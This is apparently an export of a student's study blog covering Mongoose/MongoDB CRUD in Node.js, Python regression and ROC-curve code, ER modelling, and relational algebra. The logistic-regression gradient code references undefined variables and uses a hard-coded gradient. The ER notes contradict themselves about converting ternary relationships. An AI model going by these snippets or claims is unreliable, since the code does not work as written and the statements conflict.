 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查詢 age:20 或 age:25 的文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;$<span class="keyword">or</span>:[&#123;age:<span class="number">20</span>&#125;, &#123;age:<span class="number">25</span>&#125;]&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢集結裡文檔的總數：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find().<span class="built_in">count</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="NodeJS操作"><a href="#NodeJS操作" class="headerlink" title="NodeJS操作"></a>NodeJS操作</h2><h3 id="連接數據庫"><a href="#連接數據庫" class="headerlink" title="連接數據庫"></a>連接數據庫</h3><ol>
<li><p>安裝<code>mongoose</code>模塊：</p>
<ul>
<li>用戶操作數據庫  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i mongoose</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>連接數據庫：</p>
<ul>
<li><p>創建<code>config</code>文件添加<code>db.config.js</code>文件</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入 mongoose 模塊</span></span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>)</span><br><span class="line"><span class="comment">// 連接並自動創建 donald_project 數據庫</span></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://127.0.0.1:27017/donald_project&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>app.js</code>或<code>www</code>入口文件引入</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;../config/db.config&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>創建集合：</p>
<ul>
<li>創建<code>model</code>文件專門放置模型</li>
<li>新建<code>UserModel.js</code>文件創建<code>users</code>集合  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// user模型</span></span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Schema</span> = mongoose.<span class="property">Schema</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 限制集合中的字段與類型</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserType</span> = &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="title class_">Number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建模型</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserModel</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;user&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Schema</span>(<span class="title class_">UserType</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模型 user 將會對應 users 集合（集合名字 = 模型名字 + s）</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">UserModel</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>路由中操作數據庫：</p>
<ul>
<li>引入模型即可進行操作  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">UserModel</span> = <span class="built_in">require</span>(<span class="string">&#x27;../model/UserModel&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="數據庫操作"><a href="#數據庫操作" class="headerlink" title="數據庫操作"></a>數據庫操作</h3><ol>
<li><p>添加：</p>
<ul>
<li>使用<code>Model.create()</code>方法添加文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 結構賦值 AJAX 傳來的數據</span></span><br><span class="line"><span class="keyword">const</span> &#123;username, password, age&#125; = req.<span class="property">body</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">create</span>(       <span class="comment">// 往模型添加文檔：&#123; 內容 &#125;</span></span><br><span class="line">    &#123;username, password, age&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>刪除：</p>
<ul>
<li>使用<code>Model.deleteOne()</code>方法刪除第一個符合條件的文檔</li>
<li>使用<code>Model.deleteMany()</code>方法刪除所有符合條件的文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">deleteOne</span>(    <span class="comment">// 刪除指定文檔：&#123; 條件 &#125;</span></span><br><span class="line">    &#123;<span class="attr">_id</span>:req.<span class="property">params</span>.<span class="property">id</span>&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>更改：</p>
<ul>
<li>使用<code>Model.updateOne()</code>方法更改第一個符合條件的文檔</li>
<li>使用<code>Model.updateMany()</code>方法更改所有符合條件的文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">updateOne</span>(    <span class="comment">// 更改指定文檔：&#123; 條件 &#125;, &#123; 內容 &#125;</span></span><br><span class="line">    &#123;<span class="attr">_id</span>:req.<span class="property">params</span>.<span class="property">id</span>&#125;, &#123;username, password, age&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>查詢：</p>
<ul>
<li>使用<code>Model.find()</code>方法查詢符合條件的文檔</li>
<li>可以追加<code>sort()</code>、<code>skip()</code>、<code>limit()</code>方法</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">find</span>(</span><br><span class="line">    &#123;&#125;,                     <span class="comment">// 查詢條件</span></span><br><span class="line">    [<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;age&#x27;</span>]     <span class="comment">// 獲取指定字段</span></span><br><span class="line">)</span><br><span class="line">.<span class="title function_">sort</span>(&#123;<span class="attr">age</span>:-<span class="number">1</span>&#125;)             <span class="comment">// 按照 age 倒序排序</span></span><br><span class="line">.<span class="title function_">skip</span>((page - <span class="number">1</span>) * limit).<span class="title function_">limit</span>(limit)  <span class="comment">// 指定頁面返回對應的文檔數</span></span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(data)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>NodeJS</category>
      </categories>
      <tags>
        <tag>NodeJS</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Python - Regression</title>
    <url>/myBlog/2022/09/30/2022/2022-9-30-PS-Py-LinearRegression/</url>
    <content><![CDATA[<h1 id="Linear-Regression-Curve"><a href="#Linear-Regression-Curve" class="headerlink" title="Linear Regression Curve"></a>Linear Regression Curve</h1><ol>
<li><p>Import modules</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> statistics <span class="keyword">import</span> variance</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"></span><br><span class="line">np.set_printoptions(suppress=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Import data through <code>pandas</code></p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">train_data = pd.read_csv(<span class="string">&quot;train_data.csv&quot;</span>)</span><br><span class="line">X_train = np.array(train_data[<span class="string">&#x27;x&#x27;</span>].tolist())</span><br><span class="line">y_train = np.array(train_data[<span class="string">&#x27;y&#x27;</span>].tolist())</span><br><span class="line"></span><br><span class="line">test_data = pd.read_csv(<span class="string">&quot;test_data.csv&quot;</span>)</span><br><span class="line">X_test = test_data[<span class="string">&#x27;x&#x27;</span>].tolist()</span><br><span class="line">y_test = test_data[<span class="string">&#x27;y&#x27;</span>].tolist()</span><br></pre></td></tr></table></figure>

</li>
<li><p>Compute the optimal theta based on the formula: $$\hat{\theta} &#x3D; (X^TX)^{-1}X^TY$$.</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">optimalTheta</span>(<span class="params">X, y</span>):</span><br><span class="line">    <span class="keyword">return</span> np.matmul(np.matmul(np.linalg.inv(np.matmul(X.transpose(), X)), X.transpose()), y)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Sketch the curve using <code>matplotlib.pyplot</code></p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sketchGraph</span>(<span class="params">theta, color</span>):</span><br><span class="line">    plt.scatter(X_train, y_train)</span><br><span class="line">    i = np.linspace(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> dimension <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(theta)):</span><br><span class="line">        j += theta[dimension] * <span class="built_in">pow</span>(i, dimension)</span><br><span class="line">        </span><br><span class="line">    plt.plot(i, j, color)</span><br><span class="line">    plt.xlim(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">    plt.ylim(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="Logistic-Regression"><a href="#Logistic-Regression" class="headerlink" title="Logistic Regression"></a>Logistic Regression</h1><ol>
<li><p>Set up the logistic model</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Logistic Model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">computeError</span>(<span class="params">theta</span>):</span><br><span class="line">    lm = [<span class="number">1</span>/(<span class="number">1</span> + np.exp(-(np.matmul(X_train[i].transpose(), theta)))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prediction Accuracy</span></span><br><span class="line">    p = [lm[i] ** y_train[i] * (<span class="number">1</span> - lm[i]) ** (<span class="number">1</span> - y_train[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Maximum Likelihood Estimation</span></span><br><span class="line">    E = -<span class="number">1</span> * <span class="built_in">sum</span>([np.log(p[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))])</span><br><span class="line">    <span class="keyword">return</span> E</span><br></pre></td></tr></table></figure>

</li>
<li><p>Computing the gradient</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compGradient</span>(<span class="params">X, theta</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">X, theta</span>):</span><br><span class="line">        partialDe0 = [(<span class="number">1</span> - y_train[i] - math.exp(-<span class="number">1</span> * np.matmul(X[i].transpose(), theta)) / (<span class="number">1</span> + math.exp(-<span class="number">1</span> * np.matmul(X[i].transpose(), theta)))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">        <span class="keyword">return</span> [partialDe0, partialDe1, partialDe2]</span><br><span class="line"></span><br><span class="line">    de = de(X_train, theta)</span><br><span class="line"></span><br><span class="line">    gradient = <span class="built_in">sum</span>(de)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [gradient]</span><br></pre></td></tr></table></figure>

</li>
<li><p>Computing the iteraction</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">lr = <span class="number">1</span>      <span class="comment"># learning rate</span></span><br><span class="line">theta = np.array([-<span class="number">2.5</span>, <span class="number">6.0</span>, <span class="number">0.5</span>])  <span class="comment"># initial theta</span></span><br><span class="line">gradient = np.array([<span class="number">0.723</span>, <span class="number">0.084</span>, <span class="number">0.433</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    theta = theta - gradient * lr</span><br><span class="line">    E = computeError(theta)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Iteration&#x27;</span>, i + <span class="number">1</span>, <span class="string">&#x27;=&#x27;</span>, [E])</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python - ROC Curve</title>
    <url>/myBlog/2022/09/30/2022/2022-9-30-PS-Py-ROCCurve/</url>
    <content><![CDATA[<h1 id="ROC-Curve-Plotter"><a href="#ROC-Curve-Plotter" class="headerlink" title="ROC Curve Plotter"></a>ROC Curve Plotter</h1><ol>
<li><p>Import modules</p>
<ul>
<li>Using <code>sklearn</code> to plot the ROC Curve <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score, confusion_matrix, roc_auc_score, roc_curve</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Plot curve</p>
<ul>
<li>get the <font color="#3A75EA">false positive rate</font>, <font color="#3A75EA">true positive rate</font> and <font color="#3A75EA">thresholds</font> by inputting the passing coordinates. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get the require elements</span></span><br><span class="line">fpr, tpr, thresholds = roc_curve([<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>], [<span class="number">0.56</span>, <span class="number">0.61</span>, <span class="number">0.43</span>, <span class="number">0.78</span>, <span class="number">0.12</span>, <span class="number">0.47</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># sketch the coordinates</span></span><br><span class="line">plt.scatter([<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>/<span class="number">3</span>, <span class="number">1</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># plot the curve</span></span><br><span class="line">plt.plot(fpr, tpr)</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;False Positive Rate&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True Positive Rate&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;model 1 AUC score: <span class="subst">&#123;roc_auc_score([<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>], [<span class="number">0.56</span>, <span class="number">0.61</span>, <span class="number">0.43</span>, <span class="number">0.78</span>, <span class="number">0.12</span>, <span class="number">0.47</span>])&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<!-- <font color="#3A75EA"><font/> -->]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Entity-Relationship Model</title>
    <url>/myBlog/2023/01/28/2023/CSCI3170/2023-1-28-CSCI3170-ERModel/</url>
    <content><![CDATA[<h2 id="Entity-Relationship-Diagrams"><a href="#Entity-Relationship-Diagrams" class="headerlink" title="Entity-Relationship Diagrams"></a>Entity-Relationship Diagrams</h2><img src="https://p.ipic.vip/y43qkp.jpg" width="500px" />

<ol>
<li><p><font color="3A75EA"><strong>Entity Type</strong></font></p>
<ul>
<li>an object in the real world that is distinguishable from other objects <img src="https://p.ipic.vip/73xd6j.png" width="100px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Entity Set</strong></font></p>
<ul>
<li>a collection of entities of the same type <img src="https://p.ipic.vip/azcz7x.png" width="100px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Attributes</strong></font></p>
<ul>
<li>the properties that define the entity type <img src="https://p.ipic.vip/acwaqs.png" width="100px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Key Attribute</strong></font></p>
<ul>
<li>a uniquely identifies each entity in the entity set <img src="https://p.ipic.vip/yyaazr.png" width="100px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Relationship Type</strong></font></p>
<ul>
<li>represents the association between entity types <img src="https://p.ipic.vip/cjmfqr.png" width="300px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Relationship Set</strong></font></p>
 <img src="https://p.ipic.vip/pjfz1o.png" width="300px" /></li>
</ol>
<h2 id="Key"><a href="#Key" class="headerlink" title="Key"></a>Key</h2><ol>
<li><p><font color="3A75EA"><strong>Super key</strong></font></p>
<ul>
<li>A superkey is <font color="F54747">any set of one or more attributes</font> that can uniquely identify an entity in a table.</li>
<li>It doesn’t have to be the smallest set of attributes that can do so.</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Candidate key</strong></font></p>
<ul>
<li>A candidate key is a superkey for which no proper subset is also a superkey.</li>
<li>It is a <font color="F54747">minimal set of attributes</font> that can uniquely identify an entity in a table.</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Primary key</strong></font></p>
<ul>
<li>A primary key is a candidate key that has been selected as the main key for a table.</li>
<li>There can only be <font color="F54747">one primary key</font> per table.</li>
</ul>
</li>
</ol>
<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints"></a>Constraints</h2><h3 id="Key-Constraints"><a href="#Key-Constraints" class="headerlink" title="Key Constraints"></a>Key Constraints</h3><ol>
<li><p>One-to-one</p>
<ul>
<li>An entity in A is associated with at most one entity in B.</li>
<li>An entity in B is associated with at most one entity in A.<ul>
<li>a man may be married to at most one woman, and a woman may be married to at most one man. <img src="https://p.ipic.vip/od5jt4.jpg" width="400px" /></li>
</ul>
</li>
</ul>
</li>
<li><p>One-to-many</p>
<ul>
<li>An entity in A is associated with any number in B.</li>
<li>An entity in B is associated with at most one entity in A.<ul>
<li>each child can have at most one mother, but a mother may have more than one children. <img src="https://p.ipic.vip/h0xmy9.jpg" width="400px" /></li>
</ul>
</li>
</ul>
</li>
<li><p>Many-to-one</p>
<ul>
<li>An entity in A is associated with at most one entity in B.</li>
<li>An entity in B is associated with any number in A.<ul>
<li>an employee can only work in at most one department, but a department has more than one employees. <img src="https://p.ipic.vip/gm063c.jpg" width="400px" /></li>
</ul>
</li>
</ul>
</li>
<li><p>Many-to-many</p>
<ul>
<li>Entities in A and B are associated with any number from each other.<ul>
<li>both boy and girl can have more than one girl and boy classmates resepectively. <img src="https://p.ipic.vip/w7w9d3.jpg" width="400px" /></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Participation-Constraints"><a href="#Participation-Constraints" class="headerlink" title="Participation Constraints"></a>Participation Constraints</h3><ul>
<li><p>The example of a one-to-one key constraint, noting that a man may be married to at most one woman, and a woman may be married to at most one man (<font color="3A75EA">both men and women can be unmarried</font>). Suppose we want to build a database for the “Married Persons Association”. In this case everyone must be married! In database terms their participation must be <font color="F54747">total</font>.</p>
</li>
<li><p>If the participation of an entity set in a relationship set is total, they must be connected by a <font color="F54747">bold</font> link.</p>
</li>
</ul>
<img src="https://p.ipic.vip/926h4t.jpg" width="350px">



<h3 id="Weak-Entity"><a href="#Weak-Entity" class="headerlink" title="Weak Entity"></a>Weak Entity</h3><ul>
<li><p><font color="3A75EA"><strong>Strong Entity</strong></font></p>
<ul>
<li>An entity which has a <font color="3A75EA">super key</font>.</li>
<li>Each entity can be distinguished from other entities.</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Weak Entity</strong></font></p>
<ul>
<li>An entity <font color="3A75EA">without super key</font> (only has a <font color="F54747">partial key</font>).</li>
<li>May not be able to distinguish from other entities <font color="3A75EA">without associations with entities in other entity sets</font>.</li>
</ul>
  <img src="https://p.ipic.vip/gsw7pf.jpg" width="600px" /></li>
</ul>
<h2 id="Other-Relationships"><a href="#Other-Relationships" class="headerlink" title="Other Relationships"></a>Other Relationships</h2><h3 id="Ternary-Relationships"><a href="#Ternary-Relationships" class="headerlink" title="Ternary Relationships"></a>Ternary Relationships</h3><ul>
<li><p>It is possible to have higher order relationships, including ternary relationships.</p>
  <img src="https://p.ipic.vip/wd0rmm.jpg" width="500px" />
</li>
<li><p><font color="F54747">NOTED</font>: Every ternary (and higher order) relationship can be converted into a set of binary relationships.</p>
  <img src="https://p.ipic.vip/2w87qt.jpg" />
</li>
<li><p><font color="F54747">NOTED</font>: A non-binary relationship set cannot be replaced by a number of binary relationship sets.<br><font color="F54747"><strong>The ternary relationship cannot be convert into these relationships !!!</strong></font></p>
  <img src="https://p.ipic.vip/pegxds.jpg" width="400px" /></li>
</ul>
<h3 id="Class-Hierarchies"><a href="#Class-Hierarchies" class="headerlink" title="Class Hierarchies"></a>Class Hierarchies</h3><ul>
<li>Sometimes it is natural to classify the entities in an entity set into <font color="3A75EA">subclasses</font>.  <img src="https://p.ipic.vip/vgumem.jpg" width="400px" /></li>
</ul>
<h3 id="Aggregation"><a href="#Aggregation" class="headerlink" title="Aggregation"></a>Aggregation</h3><ul>
<li>Model a relationship between a collection of entities and relationships.</li>
<li>Aggregation allows us to indicate that a relationship set participates in another relationship set.  <img src="https://p.ipic.vip/nnszjq.jpg" width="400px" /></li>
</ul>
<!-- <font color="3A75EA">Blue</font>
<font color="F54747">Red</font> -->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Relational Algebra</title>
    <url>/myBlog/2023/02/16/2023/CSCI3170/2023-2-16-CSCI3170-RelationalAlgebra/</url>
    <content><![CDATA[<!-- <style>
table{
    text-align: center;
    margin: auto auto;
    width: fit-content;
}

table th {
    display: solid;
    width: 80px;
}
</style> -->

<h2 id="Basic-Operations"><a href="#Basic-Operations" class="headerlink" title="Basic Operations"></a>Basic Operations</h2><h3 id="Select-sigma"><a href="#Select-sigma" class="headerlink" title="Select $\sigma$"></a>Select <font size="3px">$\sigma$</font></h3><ul>
<li><p>specifies the tuples to retain through a <font color="3A75EA">selection condition</font> which is a Boolean combination</p>
<p>  $$\sigma_{conditions}(R)$$</p>
  <img src="https://p.ipic.vip/rgtu0c.png" width="400px" /></li>
</ul>
<h3 id="Project-Pi"><a href="#Project-Pi" class="headerlink" title="Project $\Pi$"></a>Project <font size="3px">$\Pi$</font></h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: extract columns from a relation by specifying the field to be retained</p>
</li>
<li><p>the duplicated row will be <font color="F54747">eliminated</font></p>
<p>  $$\Pi_{fields}(R)$$</p>
  <img src="https://p.ipic.vip/rzij6p.png" width="400px" /></li>
</ul>
<h3 id="Rename-rho"><a href="#Rename-rho" class="headerlink" title="Rename $\rho$"></a>Rename <font size="3px">$\rho$</font></h3><p>$$\rho \space(R(F), \space E)$$ </p>
<ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation named R</p>
</li>
<li><p>E: relation algebra expression</p>
</li>
<li><p>F: renaming list</p>
<ul>
<li>oldname → newname<ul>
<li>$ \rho \space ( \space C ( sid → identity, \space child → dependent ), \space E )$</li>
</ul>
</li>
<li>position → newname<ul>
<li>$ \rho \space ( \space C ( 3 → identity), \space E )$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Sets-Operations"><a href="#Sets-Operations" class="headerlink" title="Sets Operations"></a>Sets Operations</h2><h3 id="Union-R-cup-S"><a href="#Union-R-cup-S" class="headerlink" title="Union $R \cup S$"></a>Union <font size="3px">$R \cup S$</font></h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation instance containing all tuples that <font color="3A75EA">occurs in either relation instance R or S</font></p>
</li>
<li><p>the duplicated row will be <font color="F54747">eliminated</font></p>
</li>
<li><p>Two relation instances must be <font color="3A75EA">union-compatible</font></p>
<ul>
<li>They have <font color="F54747">same number of fields</font></li>
<li>The corresponding fields have the <font color="F54747">same domains</font></li>
</ul>
<p>  $$R \cup S &#x3D; S \cup R$$</p>
  <img src="https://p.ipic.vip/kf2cz3.png" width="400px" /></li>
</ul>
<h3 id="Set-Different-R-S"><a href="#Set-Different-R-S" class="headerlink" title="Set Different $R - S$"></a>Set Different <font size="3px">$R - S$</font></h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation instance containing all the tuples that <font color="3A75EA">occurs in R but not in S</font></p>
</li>
<li><p>Two relation instances must be <font color="3A75EA">union-compatible</font></p>
<p>  $$R - S \ne S - R$$</p>
  <img src="https://p.ipic.vip/osr1ew.png" width="400px" /></li>
</ul>
<h3 id="Set-Intersection-R-cap-S"><a href="#Set-Intersection-R-cap-S" class="headerlink" title="Set Intersection $R \cap S$"></a>Set Intersection <font size="3px">$R \cap S$</font></h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation instance containing all tuples that <font color="3A75EA">occurs in both R and S</font></p>
</li>
<li><p>Two relation instances must be <font color="3A75EA">union-compatible</font></p>
<p>  $$R \cap S &#x3D; R - (R - S) &#x3D; S - (S - R)$$</p>
  <img src="https://p.ipic.vip/03sbta.png" width="400px" /></li>
</ul>
<h2 id="Corss-amp-Join"><a href="#Corss-amp-Join" class="headerlink" title="Corss &amp; Join"></a>Corss &amp; Join</h2><h3 id="Cartesian-Product"><a href="#Cartesian-Product" class="headerlink" title="Cartesian Product"></a>Cartesian Product</h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation instance whose schema contains all the fields of R followed by all the fields of S<br>  $$R \times S \space &#x3D; \space \langle r, s \rangle, \space \space \space r \in R, s \in S$$</p>
  <img src="https://p.ipic.vip/27lxln.png" width="400px" />
</li>
<li><p>Situation: Comparation in different entity seys</p>
<ol>
<li><p>Select the female employees and project the <code>f_name</code>, <code>l_name</code> and <code>id</code> to Empnames<br> $$ \rho \space ( \space Empnames,\space \Pi_{fname, \space lname, \space id} \space ( \space \sigma_{sex&#x3D;’F’} \space ( Employee ) ) )$$</p>
 <img src="https://p.ipic.vip/sczbps.png" width="400px" />
</li>
<li><p>FemaleEmps cross Empnames, such that they are able to compare in a table (entity)<br> $$ \rho \space ( \space EmpDependents, FemaleEmps \times Empnames )$$</p>
 <img src="https://p.ipic.vip/4hzl7b.png" width="400px" />
</li>
<li><p>Choose the row that has the same id and did and project the <code>f_name</code>, <code>l_name</code> and <code>dep_name</code> onto Results<br> $$\rho \space ( \space Results, \space \Pi_{fname, \space lname, \space depname} \space ( \space \sigma_{id &#x3D; did} \space ( EmpDependents ) ) )$$</p>
 <img src="https://p.ipic.vip/mtxewc.png" width="200px" /></li>
</ol>
</li>
</ul>
<h3 id="Condition-Join-Join"><a href="#Condition-Join-Join" class="headerlink" title="Condition Join $\Join$"></a>Condition Join $\Join$</h3><ul>
